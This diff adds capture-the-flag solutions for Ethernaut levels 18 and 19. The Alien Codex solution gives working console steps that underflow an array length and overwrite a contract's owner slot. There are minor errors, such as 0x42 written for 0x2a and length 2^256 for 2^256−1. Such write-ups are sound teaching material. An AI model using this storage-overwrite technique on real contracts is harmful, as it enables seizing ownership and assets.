@@ -395,7 +395,7 @@ If there is an overflow, the code will revert.
 
 The `transfer` method of `Token` performs some unchecked arithmetic operations on `uint256` (`uint` is shorthand for `uint256` in Solidity) integers. That is prone to underflow.
 
-The max value of a 256 bit unsigned integer can represent is 2^256 − 1, which is -
+The max value of a 256 bit unsigned integer can represent is 2<sup>256</sup> − 1, which is -
 `115,792,089,237,316,195,423,570,985,008,687,907,853,269,984,665,640,564,039,457,584,007,913,129,639,935`
 
 Hence `uint256` can only comprise values from `0` to `2^256 - 1` only. Any addition/subtraction would cause overflow/underflow. For example:
@@ -1731,7 +1731,270 @@ where `address` is the address of contract that created the transaction and `non
 
 ### Level 18. Magic Number
 
+Goal: `player` has to make a tiny contract (`Solver`) in size (10 opcodes at most) and set it's address in `MagicNum`.
+
+Given Contract:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+contract MagicNum {
+
+  address public solver;
+
+  constructor() public {}
+
+  function setSolver(address _solver) public {
+    solver = _solver;
+  }
+
+  /*
+    ____________/\\\_______/\\\\\\\\\_____
+     __________/\\\\\_____/\\\///////\\\___
+      ________/\\\/\\\____\///______\//\\\__
+       ______/\\\/\/\\\______________/\\\/___
+        ____/\\\/__\/\\\___________/\\\//_____
+         __/\\\\\\\\\\\\\\\\_____/\\\//________
+          _\///////////\\\//____/\\\/___________
+           ___________\/\\\_____/\\\\\\\\\\\\\\\_
+            ___________\///_____\///////////////__
+  */
+}
+```
+
+There's a tight restriction on size of the `Solver` contract - 10 opcodes or less. Because each opcode is 1 byte, the bytecode of the solver must be 10 bytes at max.
+
+Writing high-level solidity would yield the size much greater than just 10 bytes, so we turn to writing raw EVM bytes corresponding to contract opcodes.
+
+We need to write two sections of opcodes:
+
+- **Initialization Opcodes** which EVM uses to create the contract by replicating the runtime opcodes and returning them to EVM to save in storage.
+- **Runtime Opcodes** which contains the execution logic of the contract.
+
+Alright, so let's figure out runtime opcode first.
+
+**Runtime Opcode**
+
+The code needs to return the 32 byte magic number - 42 or `0x2a` (in hex).
+
+The corresponding opcode is `RETURN`. But, `RETURN` takes two arguments - the location of value in memory and the size of this value to be returned. That means the `0x2a` needs to be stored in memory first - which `MSTORE` facilitates. But `MSTORE` itself takes two arguments - the location of value in stack and its size. So, we need push the value and size params into stack first using `PUSH1` opcode.
+
+Lookup the opcodes to be used in opcode reference to get corresponding hex codes:
+
+| OPCODE |  NAME  |
+| :----: | :----: |
+|  0x60  | PUSH1  |
+|  0x52  | MSTORE |
+|  0xf3  | RETURN |
+
+Let's write corresponding opcodes:
+
+| OPCODE |                                   NAME                                    |
+| :----: | :-----------------------------------------------------------------------: |
+|  602a  |            Push 0x2a in stack. Value (v) param to MSTORE(0x60)            |
+|  6050  |             Push 0x50 in stack. Position (p) param to MSTORE              |
+|   52   |             Store value, v=0x2a at position, p=0x50 in memory             |
+|  6020  | Push 0x20 (32 bytes, size of v) in stack. Size (s) param to RETURN(0xf3)  |
+|  6050  | Push 0x50 (slot at which v=0x42 was stored). Position (p) param to RETURN |
+|   f3   |              RETURN value, v=0x42 of size, s=0x20 (32 bytes)              |
+
+Concatenate the opcodes and we get the bytecode: `602a60505260206050f3`, which is exactly 10 bytes, the max limit allowed by the level.
+
+**Initialization opcode**
+
+The initialization opcodes need to come before the runtime opcode. These opcodes need to load runtime opcodes into memory and return the same to EVM.
+
+To `CODECOPY` opcode can be used to copy the runtime opcodes. It takes three arguments - the destination position of copied code in memory, current position of runtime opcode in the bytecode and size of the code in bytes.
+
+Following opcodes is needed for the above purpose:
+
+| OPCODE |   NAME   |
+| :----: | :------: |
+|  0x60  |  PUSH1   |
+|  0x52  |  MSTORE  |
+|  0xf3  |  RETURN  |
+|  0x39  | CODECOPY |
+
+But we don't know the position of runtime opcode in final bytecode (since init. opcode comes before runtime opcode). Let's omit it using `--` for now and calculate the init. opcodes:
+
+| OPCODE |                                             NAME                                             |
+| :----: | :------------------------------------------------------------------------------------------: |
+|  600a  | Push 0x0a (size of runtime opcode i.e. 10 bytes) in stack. Size (s) param to COPYCODE (0x39) |
+|  60--  |                  Push -- (unknown) in stack. Position (p) param to COPYCODE                  |
+|  6000  |     Push 0x00 (chosen destination in memory) in stack. Destination (d) param to COPYCODE     |
+|   39   |               Copy code of size, s at position, p to destination, d in memory.               |
+|  600a  |  Push 0x0a (size of runtime opcode i.e. 10 bytes) in stack. Size (s) param to RETURN (0xf3)  |
+|  6000  |        Push 0x00 (location of value in memory) in stack. Position (p) param to RETURN        |
+|   f3   |                           Return value of size, s at position, p.                            |
+
+So the initialization opcode is: `600a60--600039600a6000f3`, which is 12 bytes in total.
+
+And hence runtime opcodes start at index 12 or position `0x0c`.
+
+Therefore initialization opcode must be: `600a600c600039600a6000f3`
+
+**Final Opcode**
+
+Alright we have initialization as well as runtime opcodes now. Concatenate them to get final opcode:
+
+```solidity
+    initialization opcode + runtime opcode
+
+=   600a600c600039600a6000f3 + 602a60505260206050f3
+
+=   600a600c600039600a6000f3602a60505260206050f3
+```
+
+We can now create the contract by noting the fact that a transaction sent to zero address (`0x0`) with some data is interpreted as Contract Creation by the EVM.
+
+```js
+bytecode = "600a600c600039600a6000f3602a60505260206050f3";
+txn = await web3.eth.sendTransaction({ from: player, data: bytecode });
+```
+
+After deploying get the contract address from returned transaction receipt:
+
+```js
+solverAddr = txn.contractAddress;
+```
+
+Set the address `Solver` address in `MagicNum`:
+
+```js
+await contract.setSolver(solverAddr);
+```
+
+Useful links:
+
+- [Solidity Bytecode and Opcode Basics](https://medium.com/@blockchain101/solidity-bytecode-and-opcode-basics-672e9b1a88c2)
+- [Destructuring Solidity Contract](https://blog.openzeppelin.com/deconstructing-a-solidity-contract-part-i-introduction-832efd2d7737/) series
+- EVM opcodes [reference](https://ethereum.org/en/developers/docs/evm/opcodes/)
+- txn: transaction
+- ![](https://miro.medium.com/max/1400/1*5Wrb7z3W6AMtjH6IKJYowg.jpeg)
+
 ### Level 19. Alien Codex
+
+**Goal**: `player` has to claim ownership of `AlienCodex`.
+
+Given Contract:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.5.0;
+
+import '../helpers/Ownable-05.sol';
+
+contract AlienCodex is Ownable {
+
+  bool public contact;
+  bytes32[] public codex;
+
+  modifier contacted() {
+    assert(contact);
+    _;
+  }
+
+  function make_contact() public {
+    contact = true;
+  }
+
+  function record(bytes32 _content) contacted public {
+  	codex.push(_content);
+  }
+
+  function retract() contacted public {
+    codex.length--;
+  }
+
+  function revise(uint i, bytes32 _content) contacted public {
+    codex[i] = _content;
+  }
+}
+```
+
+The target `AlienCodex` implements ownership pattern so it must have a `owner` state variable of `address` type, which can also be confirmed upon inspecting ABI (`contract.abi`). Moreover, the 20 byte `owner` is stored at slot 0 (as well as 1 byte bool `contact`).
+
+Before we start, note that every contract on Ethereum has storage like an array of 2<sup>256</sup> (indexing from 0 to 2<sup>256</sup> - 1) slots of 32 byte each.
+
+The vulnerability of `AlienCodex` originates from the `retract` method which sets a new array length without checking a potential _underflow_. Initially, `codex.length` is zero. Upon invoking `retract` method once, 1 is subtracted from zero, causing an underflow. Consequently, `codex.length` becomes 2<sup>256</sup> which is exactly equal to total storage capacity of the contract! That means any storage slot of the contract can now be written by changing the value at proper index of `codex`! This is possible because EVM doesn't validate an array's ABI-encoded length against its actual payload.
+
+First call `make_contact` so that we can pass check - `contacted`, on other methods:
+
+```js
+await contract.make_contact();
+```
+
+Modify codex length to 2<sup>256</sup> by invoking `retract`:
+
+```js
+await contract.retract();
+```
+
+Now, we have to calculate the index, `i` of `codex` which corresponds to slot 0 (where `owner` is stored).
+
+Since, `codex` is dynamically sized only it's length is stored at next slot - slot 1. And it's location/position in storage, according to allocation rules, is determined by as `keccak256(slot)` (learn more about [keccak256](https://www.educative.io/answers/what-is-hashing-with-keccak256-in-solidity)):
+
+```js
+p = keccak256(slot);
+or, (p = keccak256(1));
+```
+
+Hence, storage layout would look something like:
+
+```
+Slot          Data
+------------------------------
+    0         owner address, contact bool
+    1         codex.length
+    .
+    .
+    .
+    p         codex[0]
+  p + 1       codex[1]
+    .
+    .
+2^256 - 2     codex[2^256 - 2 - p]
+2^256 - 1     codex[2^256 - 1 - p]
+    0         codex[2^256 - p]  (overflow!)
+```
+
+Form above table it can be seen that slot 0 in storage corresponds to index, `i` = `2^256 - p` or `2^256 - keccak256(1)` of `codex`.
+
+So, writing to that index, `i` will change `owner` as well as `contact`.
+
+You can go on write some Solidity to calculate `i` using `keccak256`, but it can also be done in console which I'm going to use.
+
+Calculate position, `p` in storage of start of `codex` array
+
+```js
+// Position p
+p = web3.utils.keccak256(web3.eth.abi.encodeParameters(["uint256"], [1]));
+```
+
+Calculate the required index, `i`. Use `BigInt` for mathematical calculations between very large numbers.
+
+```js
+i = BigInt(2 ** 256) - BigInt(p);
+```
+
+Now since value to be put must be 32 byte, pad the `player` address on left with `0`s to make a total of 32 byte. Don't forget to slice off `0x` prefix from player address.
+
+```js
+content = "0x" + "0".repeat(24) + player.slice(2);
+```
+
+Finally call revise to alter the storage slot:
+
+```js
+await contract.revise(i, content);
+```
+
+This level exploits the fact that the EVM doesn't validate an array's ABI-encoded length vs its actual payload.
+
+Additionally, it exploits the arithmetic underflow of array length, by expanding the array's bounds to the entire storage area of 2<sup>256</sup>. The user is then able to modify all contract storage.
+
+Both vulnerabilities are inspired by [2017's Underhanded coding contest](https://weka.medium.com/announcing-the-winners-of-the-first-underhanded-solidity-coding-contest-282563a87079)
 
 ### Level 20. Denial
 
